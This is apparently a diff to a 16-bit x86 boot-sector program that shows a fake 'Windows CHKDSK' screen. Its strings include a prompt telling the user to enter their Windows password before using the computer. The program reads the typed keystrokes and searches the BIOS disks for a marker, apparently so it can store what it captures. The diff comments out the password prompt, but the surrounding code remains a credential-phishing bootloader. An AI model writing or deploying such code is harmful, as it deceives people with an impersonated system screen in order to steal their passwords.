@@ -1,7 +1,7 @@
 [BITS 16]
 [ORG 0x7C00]
 jmp start
-db 0x99 ; now the first four bytes are E9 81 01 99 so we can find the disk later
+disknum db 0x99 ; now the first four bytes are E9 81 01 99 so we can find the disk later
 
 %macro biosprint 1 ; This macro lets us print a message without manually loading
 mov si, %1
@@ -36,7 +36,7 @@ sleep:
   end:
    ret
 
-find_disk:
+find_disk: ; assumes dl is the disk to read
  mov dh, 0x00 ; zeroeth head
  mov ah, 0x02 ; I want to read
  mov al, 0x01 ; I want to read one sector
@@ -47,16 +47,17 @@ find_disk:
   mov al, [0x7E03]
   cmp al, 0x99
   jne nope
+   mov BYTE [disknum], dl
    biosprint ya
    jmp done_find_disk
- nope:
-  biosprint no
- done_find_disk:
-  ret
+  nope:
+   biosprint no
+  done_find_disk:
+   ret
 
 ; Declarations
 checkfs db 'Windows CHKDSK', 13, 10, '==============', 13, 10, 13, 10, 'Checking file system on C:', 0
-ntfs db 13, 10, 'The type of file system is NTFS.', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency. You', 13, 10, 'must complete this disk check before using your computer.', 13, 10, 13, 10, 'Enter your Windows password to continue: ', 0
+;ntfs db 13, 10, 'The type of file system is NTFS.', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency. You', 13, 10, 'must complete this disk check before using your computer.', 13, 10, 13, 10, 'Enter your Windows password to continue: ', 0
 rmchar db 8,' ',8,0
 checking db 13,10,13,10, 'Cheking volume C:', 13,10,'This may take a few minutes.',0
 ya db 'ok!',0
@@ -70,7 +71,7 @@ start:
 
  biosprint checkfs
  call sleep
- biosprint ntfs
+; biosprint ntfs
 
 readchar:
  mov ah, 00h
@@ -98,6 +99,15 @@ mov dl, 0x80
 call find_disk
 mov dl, 0x81
 call find_disk
+cmp BYTE [disknum], 0x99
+je nosir
+ biosprint ya
+ jmp end_find_disk
+nosir:
+ biosprint no
+end_find_disk:
+
+
 
 last:
  jmp $
